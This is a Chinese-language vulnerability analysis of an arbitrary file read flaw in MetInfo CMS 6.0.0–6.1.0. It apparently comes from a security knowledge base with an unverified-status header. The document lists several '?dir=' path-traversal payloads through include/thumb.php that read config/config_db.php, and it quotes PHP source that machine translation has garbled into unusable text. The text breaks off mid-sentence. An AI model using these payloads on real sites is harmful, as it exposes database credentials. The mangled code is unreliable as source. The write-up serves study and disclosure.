---
source: "hatch 补库批 20260928"
product: "MetInfo6.0.0–6.1.0 old_thumb"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Metinfo任意文件读取"
prerequisites: "来源所述条件，未列明部分仍待核：include/thumb.php可达，含http字符串且路径处理绕过；反斜杠载荷Windows条件"
side_effects: "未执行；本文需注意的操作影响：整段PHP被机器翻译为公共功能/扩展了/网络、全角标点和变量空格，源码不可用"
source_status: "unknown"
id: "vw-2ed099f8484b18f750e57291"
entity_id: "ve-2ed099f8484b18f750e57291"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：include/thumb.php可达，含http字符串且路径处理绕过；反斜杠载荷Windows条件

- **结论使用边界（1）**：整段PHP被机器翻译为公共功能/扩展了/网络、全角标点和变量空格，源码不可用。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（2）**：文末在读取config/config_截断；缺完整HTTP请求/原始来源。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（3）**：payload含不存在http路径段是否可解析取决平台/实际目录，不能仅字符串替换推断任意读；影响列表两版本与简介区间需明确。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# MetInfo 任意文件读取

一、漏洞简介
------------

MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo
6.0.0\~6.1.0版本中的
old\_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件

二、漏洞影响
------------

MetInfo 6.0.0 MetInfo 6.1.0

三、复现过程
------------

### 漏洞分析

进攻分析
看下\\MetInfo6\\app\\system\\include\\module\\old\_thumb.class.php

    <？php 
    ＃MetInfo企业内容管理系统
    ＃版权所有（C）MetInfo Co.，Ltd（http://www.metinfo.cn）。版权所有。

    define（'IN_MET'）或 退出（'No权限'）;

    load :: sys_class（'web'）;

    class  old_thumb  扩展了 网络 {

          公共 功能 doshow （） { 全局 $ _M;


            $ DIR = str_replace函数（'../' ，''，$ _GET [ '目录' ]）;


            if（strstr（str_replace（$ _ M [ 'url' ] [ 'site' ]，''，$ dir），'http'））{ 
                header（“ Content-type：image / jpeg”）; 
                ob_start（）; 
                readfile（$ dir）; 
                ob_flush（）; 
                flush（）; 死 ;         }



            if（$ _M [ 'form' ] [ 'pageset' ]）{ 
              $ path = $ dir。“＆met-table = {$ _ M ['form'] ['met-table']}＆met-field = {$ _ M ['form'] ['met-field']}”“；

            } else { 
              $ path = $ dir; 
            } 
            $ image = thumb（$ path，$ _ M [ 'form' ] [ 'x' ]，$ _ M [ 'form' ] [ 'y' ]）; if（$ _M [ 'form' ] [ 'pageset' ]）{           $ img = explode（'？'，$ image）;           $ img = $ img [ 0 ];         } else {           $ img = $ image;         } if（$ img）{             header（“ Content-type：image / jpeg”）;             ob_start（）;









                readfile（PATH_WEB.str_replace（$ _ M [ 'url' ] [ 'site' ]，''，$ img））; 
                ob_flush（）; 
                flush（）; 
            }

        } 
    }

    ＃此程序是一个开放源代码系统，可用于商业用途，请自觉购买商业许可证。
    ＃版权所有（C）MetInfo Co.，Ltd.（http://www.metinfo.cn）。版权所有。
    ？>

从代码中看用看到，\$dir直接由\$\_GET\[\'dir\'\]传递进来，并将../置空。目标是进入到第一个，如果里面的readfile(\$dir);，读取文件。看看如果语句的条件，的英文外面一个strstr函数，判断\$dir中http字符串的首次出现位置，实质上，要进入到这个if语句里面，\$dir中必须包含http字符串。里面的将\$dir中包含\$\_M\[\'url\'\]\[\'site\'\]的部分放置空，这里可以不用管。

![](./.resource/Metinfo任意文件读取/media/rId25.png)

从上面的分析可以构造出有效负载，只要\$dir里包含http字符串就可以进入到readfile函数从而重新读取任意函数，然后可以使用\..././来进行目录替换，因为../会被置空，所以最终payload如下

    ?dir=..././http/..././config/config_db.php
    ?dir=.....///http/.....///config/config_db.php
    ?dir=http/.....///.....///config/config_db.php
    ?dir=http\..\..\config\config_db.php

### 漏洞复现

要先找到调用old\_thumb.class.php的文件，看到include/thumb.php，可以从这个文件里面进入到old\_thumb.class.php

    <?php
    # MetInfo Enterprise Content Management System
    # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.
    define('M_NAME', 'include');
    define('M_MODULE', 'include');
    define('M_CLASS', 'old_thumb');
    define('M_ACTION', 'doshow');
    require_once '../app/system/entrance.php';
    # This program is an open source system, commercial use, please consciously to purchase commercial license.
    # Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.
    ?>

所以我们通过thumb.php将构造好的\$dir传入即可。

![](./.resource/Metinfo任意文件读取/media/rId27.png)

可以看到成功的读取到了config/config\_
